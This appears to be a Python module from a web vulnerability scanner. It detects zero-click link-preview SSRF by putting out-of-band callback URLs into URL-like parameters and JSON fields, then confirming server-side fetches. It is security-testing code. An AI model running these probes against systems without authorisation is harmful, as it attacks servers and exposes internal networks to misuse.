#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK — Zero-Click Link-Preview SSRF

⚠️ FOR AUTHORIZED TESTING ONLY ⚠️

Detects endpoints that unfurl / preview / metadata-fetch a URL out of
attacker-controlled input. That's a zero-click pattern: attacker posts
a URL to a comment, chat message, webhook, invite, avatar, SSO-metadata
field, and the server fetches it from its own network position.

Coverage:
  * Chat / issue trackers (OpenGraph unfurl) — Slack, Mattermost,
    Discord, GitLab, Confluence, Jira, GitHub Issues.
  * Webhook receivers that GET the URL to verify.
  * Avatar / profile-image fetchers.
  * SSO metadata URL loaders.
  * PDF / preview generators.

The trigger surface here is any parameter whose NAME suggests a URL
input (url, link, source, avatar, image, webhook, callback, redirect,
metadata, feed). The confirmation is single-sourced: OOB collector
sees a hit from the target's server IP (not from the operator).
"""
from __future__ import annotations

import re
from typing import Iterable

from modules.base import BaseModule


# Param names that commonly carry a URL the server will fetch server-side.
_URL_PARAM_RE = re.compile(
    r"^(url|link|href|src|source|target|redirect|callback|webhook|"
    r"return|redirect_uri|next|dest|destination|"
    r"avatar|avatar_url|image|image_url|picture|photo|logo|"
    r"metadata|metadata_url|meta|feed|feed_url|rss|atom|"
    r"embed|oembed|thumbnail|preview|og_url|"
    r"import|fetch|proxy|fromurl|from_url|"
    r"sso_url|idp|discovery)$",
    re.IGNORECASE,
)


def _url_looking_value(v: str) -> bool:
    """Value looks like it currently holds a URL (heuristic — helps us
    prioritize endpoints that clearly consume URLs vs. name-only matches)."""
    if not isinstance(v, str):
        return False
    return v.startswith(("http://", "https://", "//")) or "://" in v


class LinkPreviewSSRFModule(BaseModule):
    """Zero-click link-preview / server-side URL fetcher detection."""

    name = "Zero-Click Link-Preview SSRF"
    vuln_type = "link_preview_ssrf"

    # Body-field candidates for POST endpoints that lack an obvious
    # url-shaped parameter but might accept one in a nested field.
    _BODY_URL_KEYS = (
        "url", "link", "webhook", "callback", "avatar",
        "image", "source", "feed", "metadata",
    )

    # ------------------------------------------------------------------

    def test(self, url: str, method: str, param: str, value: str):
        """Parameter-level probe: if param name or value screams URL,
        replace with an OOB URL and confirm via callback."""
        if not (_URL_PARAM_RE.match(param or "") or _url_looking_value(value)):
            return
        self._probe(url, method, param, value)

    def test_url(self, url: str):
        """Endpoint-level probe: if the URL itself has a query key that
        looks URL-shaped, hit it. Also POST a small JSON body with
        common url-carrying keys — catches webhook receivers /
        chat-message endpoints that don't advertise a URL parameter
        upstream."""
        # POST JSON probes with each common URL key. Kept small so we
        # don't hammer the target.
        oob = getattr(self.engine, "oob_manager", None)
        if oob is None or not getattr(oob, "enabled", False):
            return
        for key in self._BODY_URL_KEYS:
            self._probe(url, "POST", key, value="",
                        body_json_key=key)

    # ------------------------------------------------------------------

    def _probe(self, url: str, method: str, param: str, value: str,
               *, body_json_key: str = ""):
        oob = getattr(self.engine, "oob_manager", None)
        if oob is None or not getattr(oob, "enabled", False):
            return

        token, callback_url = oob.get_callback_url(
            vuln_type=self.vuln_type, url=url, param=param,
        )
        if not token or not callback_url:
            return

        # Fire the fetch attempt. Include a unique per-token path
        # segment so a hit ties back to (url, param) unambiguously.
        try:
            if body_json_key:
                import json as _json
                self.requester.request(
                    url, method,
                    data=_json.dumps({body_json_key: callback_url}),
                    headers={"Content-Type": "application/json"},
                )
            elif method.upper() == "GET":
                # Replace the param's value with our callback URL
                # via the standard requester (framework builds the
                # query string).
                self.requester.request(
                    url, "GET", data={param: callback_url},
                )
            else:
                self.requester.request(
                    url, method, data={param: callback_url},
                )
        except Exception:
            return

        try:
            hits = oob.check(token, timeout=int(self.config.get("oob_timeout", 10)))
        except Exception:
            hits = []
        if not hits:
            return

        # Extract source IP if the collector recorded it — a hit from
        # the operator IP is worthless, but if the collector filters
        # or the target NATs, we can only report what we see.
        first = hits[0] if isinstance(hits, list) else {}
        source_ip = str(first.get("source_ip") or "unknown")
        ua = ""
        try:
            headers = first.get("headers") or {}
            ua = str(headers.get("User-Agent") or headers.get("user-agent") or "")
        except Exception:
            pass

        from core.engine import Finding
        self.engine.add_finding(Finding(
            technique="Zero-Click Link-Preview SSRF (OOB confirmed)",
            url=url,
            severity="HIGH",
            confidence=0.95,
            param=param,
            payload=f"callback_url={callback_url}",
            evidence=(
                f"Server-side fetch from {source_ip} (UA={ua[:100]!r}) after "
                f"submitting an attacker-controlled URL in {param!r}. "
                f"Endpoint auto-unfurls / fetches / previews URLs — SSRF "
                f"surface reachable without user interaction."
            ),
        ))
